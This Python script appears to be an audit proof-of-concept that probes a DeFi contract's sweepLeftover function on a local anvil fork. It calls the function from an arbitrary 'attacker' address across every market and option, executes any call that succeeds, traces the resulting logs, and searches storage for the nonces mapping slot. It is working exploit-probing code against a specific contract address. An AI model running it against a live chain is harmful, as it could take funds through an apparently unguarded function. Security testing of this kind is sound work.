#!/usr/bin/env python3
"""TayDex pass17: FORK-ATTACK on sweepLeftover -- the one mutating path that reached its body
from an unprivileged address (pass8: body reasons 'no leftover'/'not resolved', never the auth
selector). sweepLeftover takes no address argument, so `dest` is derived internally.

On my own anvil fork (no real chain, no real funds):
 1. enumerate every market x option, call sweepLeftover from an arbitrary address
 2. record which succeed
 3. for a success, execute it and trace where the value actually goes (caller vs feeRecipient)
 4. also identify the `nonces` mapping slot, to see if the nonce key is msg.sender
"""
import json, os, urllib.request

R = "http://127.0.0.1:8546"
C = "0x3ade22fa1ef5ac75437a3734d91ba588e54875dd"
TGT = os.path.join(os.path.dirname(os.path.abspath(__file__)), "taydex")
from Crypto.Hash import keccak as _k
def keccak(b): h = _k.new(digest_bits=256); h.update(b); return h.digest()
def sig4(s): return keccak(s.encode()).hex()[:8]

def rpc(m, p):
    req = urllib.request.Request(R, data=json.dumps({"jsonrpc": "2.0", "id": 1,
                                                     "method": m, "params": p}).encode(),
                                 headers={"Content-Type": "application/json"})
    return json.loads(urllib.request.urlopen(req, timeout=60).read())

def w(v): return f"{int(v):064x}"
def addr32(x): return x.lower().replace("0x", "").rjust(64, "0")

ATTACKER = "0x00000000000000000000000000000000deadbeef"

# ---------- 1. enumerate markets ----------
n = int(rpc("eth_call", [{"to": C, "data": "0x" + sig4("nextMarketId()")}, "latest"])["result"], 16)
print(f"nextMarketId = {n}  ({n-1} markets)\n")
markets = {}
for mid in range(1, n):
    r = rpc("eth_call", [{"to": C, "data": "0x" + sig4("getMarket(uint256)") + w(mid)}, "latest"])["result"][2:]
    creator = "0x" + r[24:64]
    numopt = int(r[128:192], 16)
    resolved = int(r[256:320], 16)
    win = int(r[320:384], 16); win = win - 2**16 if win >= 2**15 else win
    markets[mid] = (creator, numopt, resolved, win)

print("=" * 100)
print("MARKET TABLE")
print("=" * 100)
for mid, (cr, no, rs, wn) in markets.items():
    print(f"  market {mid:<3} creator={cr} options={no:<3} resolved={bool(rs)} winning={wn}")

# ---------- 2. probe sweepLeftover everywhere ----------
print("\n" + "=" * 100)
print(f"SWEEP PROBE as {ATTACKER} (eth_call only)")
print("=" * 100)
succ, reverted = [], []
for mid, (cr, no, rs, wn) in markets.items():
    for oi in range(max(no, 1)):
        data = "0x" + sig4("sweepLeftover(uint256,uint16)") + w(mid) + w(oi)
        r = rpc("eth_call", [{"from": ATTACKER, "to": C, "data": data}, "latest"])
        if "error" in r:
            err = r["error"]; d = err.get("data")
            msg = ""
            if isinstance(d, str) and d.startswith("0x08c379a0"):
                ln = int(d[10:74], 16)
                msg = bytes.fromhex(d[74:74 + ln * 2]).decode("utf-8", "replace")
            elif d:
                msg = f"selector {d[:10]}"
            reverted.append((mid, oi, msg or err.get("message")))
        else:
            succ.append((mid, oi, r["result"]))
            print(f"  *** market {mid} option {oi} -> SURVIVED  result={r['result']}")

print(f"\n  succeeded: {len(succ)}   reverted: {len(reverted)}")
from collections import Counter
print("  revert reasons:", dict(Counter(m for _, _, m in reverted)))

# show the non-trivial revert reasons (not just 'no leftover')
print("\n  reverts other than 'no leftover':")
seen = set()
for mid, oi, m in reverted:
    if m != "no leftover" and m not in seen:
        seen.add(m)
        print(f"    market {mid} option {oi}: {m}")

# ---------- 3. execute a success (if any) and trace funds ----------
if succ:
    mid, oi, _ = succ[0]
    print("\n" + "=" * 100)
    print(f"EXECUTING sweepLeftover({mid},{oi}) on the fork as {ATTACKER}")
    print("=" * 100)
    bal_before = int(rpc("eth_getBalance", [ATTACKER, "latest"])["result"], 16)
    frec = "0x" + rpc("eth_call", [{"to": C, "data": "0x" + sig4("feeRecipient()")}, "latest"])["result"][-40:]
    frec_before = int(rpc("eth_getBalance", [frec, "latest"])["result"], 16)
    # give the attacker gas
    rpc("anvil_setBalance", [ATTACKER, hex(10**18)])
    tx = rpc("eth_sendTransaction", [{"from": ATTACKER, "to": C,
                                      "data": "0x" + sig4("sweepLeftover(uint256,uint16)") + w(mid) + w(oi)}])
    print(f"  tx: {tx}")
    rc = rpc("eth_getTransactionReceipt", [tx.get("result")])
    print(f"  status: {rc.get('result', {}).get('status')}")
    print(f"  logs: {len(rc.get('result', {}).get('logs', []))}")
    for lg in rc.get("result", {}).get("logs", []):
        print(f"    topic0={lg['topics'][0]}  from={lg['address']}")
else:
    print("\n  no market currently has sweepable leftovers -> cannot demonstrate a payout.")
    print("  (the guard absence stands, but impact is unproven)")

# ---------- 4. nonces mapping slot ----------
print("\n" + "=" * 100)
print("IDENTIFY THE `nonces` MAPPING SLOT (is the key msg.sender?)")
print("=" * 100)
signer = "0x" + rpc("eth_call", [{"to": C, "data": "0x" + sig4("signer()")}, "latest"])["result"][-40:]
print(f"  signer() = {signer}   nonces(signer) = "
      f"{int(rpc('eth_call', [{'to': C, 'data': '0x' + sig4('nonces(address)') + addr32(signer)}, 'latest'])['result'], 16)}")
for slot in range(0, 16):
    key = keccak(bytes.fromhex(addr32(signer)) + slot.to_bytes(32, "big")).hex()
    v = rpc("eth_getStorageAt", [C, "0x" + key, "latest"])["result"]
    d = int(v, 16)
    if d != 0:
        print(f"  slot {slot} -> storage[keccak(addr,{slot})] = {d}   <== candidate `nonces` slot")
